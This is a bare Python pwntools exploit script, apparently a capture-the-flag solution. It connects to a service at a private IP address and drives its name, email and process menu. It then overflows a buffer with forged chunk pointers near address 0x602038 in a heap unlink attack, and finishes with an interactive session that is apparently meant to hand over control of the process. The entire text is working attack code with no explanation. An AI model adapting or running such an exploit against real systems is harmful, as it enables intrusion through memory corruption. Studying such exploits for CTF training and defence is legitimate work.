from pwn import *

s = remote('192.168.0.85',1234)
def change_name(name):
  s.recvuntil('6. Exit')
  s.send('3\n')
  s.recvuntil('name:')
  s.send(name)
def change_email(email):
  s.recvuntil('6. Exit')
  s.send('4\n')
  s.recvuntil('email:')
  s.send(email)
def process():
  s.recvuntil('6. Exit')
  s.send('5\n')

change_name('A'*0x40+'\n')
change_email('A'*0xef+'\n')
process()
dat = '\x00'*0x10
dat += p64(0x602038-0x18)
dat += p64(0x602038-0x10)
dat += '\x00'*(0x40-len(dat))
dat += p64(0x40)
change_name(dat+'\n')
raw_input()
change_email('\n')
s.interactive()
